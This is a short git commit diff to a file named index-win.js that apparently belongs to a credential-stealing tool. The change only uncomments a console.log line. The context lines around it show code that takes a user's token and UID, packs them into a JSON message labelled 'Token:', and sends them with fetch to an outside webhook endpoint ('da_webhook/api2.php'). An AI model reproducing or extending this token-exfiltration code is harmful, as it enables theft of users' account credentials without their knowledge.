19e41f95cc0850ed4d7f0b7de76ecfaa4de47e4e
Korobeiniki <64863281+Korobeiniki17@users.noreply.github.com>
2021-12-05 11:32:44 -0300

    Update index-win.js

--- index-win.js
+++ index-win.js
@@ -63,7 +63,7 @@ function koro(p) {
                     
                     token = token.replace(/"/g, '');
                     var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
-                    //console.log(a)
+                    console.log(a)
                     fetch("http://da_webhook/api2.php?type=old", {
                     "headers": {
                         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
